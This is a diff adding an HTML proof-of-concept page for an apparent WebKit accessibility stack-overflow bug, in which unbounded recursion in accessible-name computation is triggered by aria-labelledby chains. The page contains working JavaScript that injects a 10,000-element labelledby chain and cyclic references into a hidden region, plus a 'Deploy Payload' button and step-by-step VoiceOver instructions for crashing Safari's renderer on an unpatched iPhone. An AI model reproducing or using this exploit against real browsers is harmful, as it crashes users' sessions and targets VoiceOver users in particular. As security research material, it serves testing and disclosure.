@@ -1,0 +1,154 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#faf9f5;color:#141413}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>AX Accname Overflow</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+<style>
+:root{--bg:#0c0c0c;--surf:#161616;--card:#1e1e1e;--border:#2a2a2a;--text:#e4e4e4;--muted:#888;--dim:#555;--red:#ff453a;--amber:#ff9f0a;--green:#32d74b;--blue:#0a84ff;--red-dim:rgba(255,69,58,.12);--amber-dim:rgba(255,159,10,.1);--green-dim:rgba(50,215,75,.1)}
+@media(prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#f2f2f7;--surf:#fff;--card:#f8f8f8;--border:#d8d8d8;--text:#1c1c1e;--muted:#6c6c70;--dim:#aeaeb2;--red:#ff3b30;--amber:#ff9500;--green:#34c759}}
+:root[data-theme="dark"]{--bg:#0c0c0c;--surf:#161616;--card:#1e1e1e;--border:#2a2a2a;--text:#e4e4e4;--muted:#888;--dim:#555;--red:#ff453a;--amber:#ff9f0a;--green:#32d74b;--red-dim:rgba(255,69,58,.12);--amber-dim:rgba(255,159,10,.1);--green-dim:rgba(50,215,75,.1)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;font-size:14px;line-height:1.6;padding-inline:16px;padding-block:28px;min-height:100%}
+.wrap{max-width:580px;margin-inline:auto;display:flex;flex-direction:column;gap:16px}
+.bug-id{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;letter-spacing:.08em;color:var(--muted);text-transform:uppercase}
+.sev-badge{background:var(--red-dim);border:1px solid rgba(255,69,58,.3);color:var(--red);border-radius:3px;padding:2px 7px}
+h1{font-size:20px;font-weight:600;letter-spacing:-.02em;line-height:1.3}
+.sub{color:var(--muted);font-size:13px;max-width:52ch}
+.card{background:var(--surf);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.card-head{padding:11px 16px;border-bottom:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;display:flex;align-items:center;gap:8px}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0}
+.dot.red{background:var(--red)}.dot.amber{background:var(--amber)}.dot.green{background:var(--green);animation:blink 1.4s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.log{padding:14px 16px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.85;display:flex;flex-direction:column;gap:1px;min-height:72px}
+.log-line{display:flex;gap:10px;align-items:flex-start}
+.log-line .prompt{color:var(--dim);flex-shrink:0}.log-line .msg{color:var(--text);word-break:break-word}
+.log-line.ok .msg{color:var(--green)}.log-line.warn .msg{color:var(--amber)}.log-line.err .msg{color:var(--red)}.log-line.dim .msg{color:var(--muted)}
+.info-grid{display:grid;grid-template-columns:auto 1fr;gap:0}
+.info-row{display:contents}
+.info-row .label,.info-row .val{padding:10px 16px;font-family:'JetBrains Mono',monospace;font-size:12px;border-bottom:1px solid var(--border)}
+.info-row:last-child .label,.info-row:last-child .val{border-bottom:none}
+.info-row .label{color:var(--muted);white-space:nowrap}.info-row .val{color:var(--text);word-break:break-all}
+.info-row .val.red{color:var(--red)}.info-row .val.green{color:var(--green)}.info-row .val.amber{color:var(--amber)}
+.btn-row{padding:14px 16px;display:flex;gap:10px;flex-wrap:wrap;border-top:1px solid var(--border)}
+.btn{display:inline-flex;align-items:center;gap:6px;font-family:'Inter',sans-serif;font-size:13px;font-weight:600;padding:8px 16px;border-radius:6px;border:none;cursor:pointer;transition:opacity .15s}
+.btn:active{opacity:.75}.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn-primary{background:var(--red);color:#fff}.btn-secondary{background:var(--card);border:1px solid var(--border);color:var(--text)}
+.code-block{padding:14px 16px;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text);overflow-x:auto;line-height:1.7;background:var(--card)}
+.code-block .kw{color:#bf5af2}.code-block .str{color:var(--green)}.code-block .cm{color:var(--dim)}
+.status-bar{padding:12px 16px;border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:600;display:flex;align-items:center;gap:10px}
+.status-bar.vuln{background:var(--red-dim);border:1px solid rgba(255,69,58,.25);color:var(--red)}
+.status-bar.unknown{background:var(--amber-dim);border:1px solid rgba(255,159,10,.25);color:var(--amber)}
+.status-bar.safe{background:var(--green-dim);border:1px solid rgba(50,215,75,.25);color:var(--green)}
+.steps{padding:4px 0}
+.step{display:flex;gap:14px;padding:14px 16px;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none}
+.step-num{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:var(--muted);padding-top:2px;flex-shrink:0}
+.step-title{font-weight:600;font-size:13px;margin-bottom:3px}
+.step-desc{color:var(--muted);font-size:12px;line-height:1.5}
+</style>
+
+<div class="wrap">
+  <div>
+    <div class="bug-id"><span class="sev-badge">HIGH</span> WebKit · Accessibility</div>
+    <h1>AX Accname Stack Overflow via aria-labelledby Chain</h1>
+    <p class="sub">Unbounded recursion in accessibleNameForNode() — no depth limit pre-fix commit b59033bd02</p>
+  </div>
+  <div class="status-bar unknown" id="statusBar"><span>◆</span><span id="statusText">PAYLOAD BUILDING...</span></div>
+  <div class="card">
+    <div class="card-head"><span class="dot red"></span>Vulnerability Details</div>
+    <div class="info-grid">
+      <div class="info-row"><div class="label">Fixed in</div><div class="val amber">WebKit main · commit b59033bd · Sep 14 2026</div></div>
+      <div class="info-row"><div class="label">Status on iOS 26.5.2</div><div class="val red">UNPATCHED (build predates fix)</div></div>
+      <div class="info-row"><div class="label">Crash target</div><div class="val">WebContent process (renderer)</div></div>
+      <div class="info-row"><div class="label">Root cause</div><div class="val">accessibleNameForNode() → textUnderElement() recursion, no depth limit</div></div>
+      <div class="info-row"><div class="label">Trigger</div><div class="val">aria-labelledby chain ≥ ~10 000 elements OR cyclic reference</div></div>
+      <div class="info-row"><div class="label">Activation</div><div class="val">VoiceOver active, or AX isolated tree update</div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="dot green" id="logDot"></span>Live Probe Log</div>
+    <div class="log" id="log"></div>
+    <div class="btn-row">
+      <button class="btn btn-primary" id="deployBtn" onclick="deployPayload()">▶ Deploy Payload</button>
+      <button class="btn btn-secondary" onclick="tryAOMTrigger()">⚡ Force AX Query</button>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="dot"></span>Payload Configuration</div>
+    <div class="info-grid">
+      <div class="info-row"><div class="label">Chain length</div><div class="val green" id="chainLenDisplay">—</div></div>
+      <div class="info-row"><div class="label">Cycle patterns</div><div class="val">figcaption↔img, fieldset↔legend, host1↔host2</div></div>
+      <div class="info-row"><div class="label">Stack depth est.</div><div class="val red">~10 000 frames × ~64B = ~640KB (exceeds 512KB iOS stack)</div></div>
+      <div class="info-row"><div class="label">AX paths affected</div><div class="val">aria-labelledby, aria-describedby, &lt;label&gt;, &lt;figcaption&gt;, slots</div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="dot amber"></span>Trigger Steps (on iPhone 15)</div>
+    <div class="steps">
+      <div class="step"><div class="step-num">01</div><div class="step-body"><div class="step-title">Deploy the payload</div><div class="step-desc">Tap "Deploy Payload" above. Injects 10 000 chained aria-labelledby elements and cyclic patterns into the DOM.</div></div></div>
+      <div class="step"><div class="step-num">02</div><div class="step-body"><div class="step-title">Enable VoiceOver</div><div class="step-desc">Settings → Accessibility → VoiceOver → ON. Or triple-click side button.</div></div></div>
+      <div class="step"><div class="step-num">03</div><div class="step-body"><div class="step-title">Focus Safari</div><div class="step-desc">Swipe right to move VoiceOver focus. When it hits the payload region the AX tree computes names — stack overflow triggers.</div></div></div>
+      <div class="step"><div class="step-num">04</div><div class="step-body"><div class="step-title">Observe WebContent crash</div><div class="step-desc">Safari tab blanks and reloads. Check Settings → Privacy → Analytics Data for "WebContent" crash reports.</div></div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="dot"></span>Crash Call Chain</div>
+    <div class="code-block">
+<span class="cm">// Recursive name computation — no depth guard pre-fix</span>
+<span class="kw">textUnderElement</span>()        <span class="cm">// AccessibilityNodeObject.cpp</span>
+  → <span class="kw">alternativeText</span>()        <span class="cm">// follows aria-labelledby</span>
+    → <span class="kw">accessibleNameForNode</span>() <span class="cm">// resolves reference target</span>
+      → <span class="kw">textUnderElement</span>()     <span class="cm">// recurse on target</span>
+        → ... × 10 000         <span class="cm">// stack overflow → SIGBUS</span>
+
+<span class="cm">// Fix: visited-node tracking + early-exit on cycle</span>
+<span class="cm">// Commit b59033bd02 — Sep 14 2026 — NOT in iOS 26.5.2</span>
+    </div>
+  </div>
+</div>
+
+<div id="payloadRegion" style="position:absolute;left:-9999px;top:0;width:1px;overflow:hidden" aria-hidden="true"></div>
+
+<script>
+function log(msg,cls){const el=document.getElementById('log');const line=document.createElement('div');line.className='log-line'+(cls?' '+cls:'');line.innerHTML='<span class="prompt">›</span><span class="msg">'+msg+'</span>';el.appendChild(line);el.scrollTop=el.scrollHeight}
+function setStatus(text,kind){const bar=document.getElementById('statusBar');bar.className='status-bar '+(kind||'unknown');document.getElementById('statusText').textContent=text}
+const CHAIN_LEN=10000;
+function buildPayload(){
+  log('Building '+CHAIN_LEN+'-element aria-labelledby chain...','dim');
+  let html='';
+  for(let i=0;i<CHAIN_LEN;i++){html+='<div id="axc'+i+'"><span aria-labelledby="axc'+(i+1)+'">x</span></div>'}
+  html+='<div id="axc'+CHAIN_LEN+'">chain-end</div>';
+  html+='<div><span id="axChainStart" aria-labelledby="axc0">trigger-point</span></div>';
+  html+='<figure id="axFig"><figcaption id="axCap"><img id="axImg" alt=""></figcaption></figure>';
+  html+='<fieldset id="axFs"><legend><span aria-labelledby="axFs">legend</span></legend>fs</fieldset>';
+  html+='<div id="axH1" aria-labelledby="axH2">h1</div>';
+  html+='<div id="axH2" aria-labelledby="axH1">h2</div>';
+  document.getElementById('payloadRegion').innerHTML=html;
+  document.getElementById('chainLenDisplay').textContent=CHAIN_LEN+' elements';
+  log('Payload built: '+CHAIN_LEN+' chain + 3 cycle patterns','ok');
+}
+function deployPayload(){
+  const btn=document.getElementById('deployBtn');btn.disabled=true;
+  log('Injecting payload into DOM...','');
+  setTimeout(()=>{
+    buildPayload();
+    document.getElementById('payloadRegion').removeAttribute('aria-hidden');
+    log('aria-hidden removed — payload visible to AX tree','warn');
+    log('Ready. Enable VoiceOver to trigger recursion crash.','ok');
+    setStatus('PAYLOAD DEPLOYED — ENABLE VOICEOVER TO TRIGGER','vuln');
+    btn.textContent='✓ Deployed';
+    tryAOMTrigger();
+  },50);
+}
+function tryAOMTrigger(){
+  log('Attempting JS-accessible AX trigger paths...','dim');
+  try{const el=document.getElementById('axChainStart');if(el){const _=el.ariaLabel;log('ariaLabel read: ok (attribute only)','dim')}}catch(e){}
+  try{const el=document.getElementById('axChainStart');if(el&&'computedRole' in el){log('computedRole: '+el.computedRole+' (AOM active)','ok')}else{log('computedRole: not supported — need VoiceOver','dim')}}catch(e){}
+  try{const el=document.getElementById('axChainStart');if(el&&'computedName' in el){const t0=performance.now();const name=el.computedName;const dt=performance.now()-t0;log('computedName in '+dt.toFixed(1)+'ms: "'+(name||'(empty)')+'"','ok');if(dt>1000)log('WARNING: >1s — recursion hit guard or slowdown','warn')}else{log('computedName: not exposed — VoiceOver required','dim')}}catch(e){log('computedName threw: '+e.message+' (possible stack overflow)','err')}
+  try{const el=document.getElementById('axChainStart');if(el){el.setAttribute('tabindex','0');el.focus();log('Element focused — AX queued if VoiceOver active','dim');el.blur()}}catch(e){}
+  log('JS probing done. VoiceOver required for full trigger.','dim');
+}
+setTimeout(buildPayload,100);
+setStatus('PAYLOAD READY — TAP DEPLOY','unknown');
+log('Loaded. iOS 26.5.2 / WebKit 605.1.15','dim');
+log('Bug: b59033bd02 unfixed — accname has no recursion bound','warn');
+</script>
+</body></html>
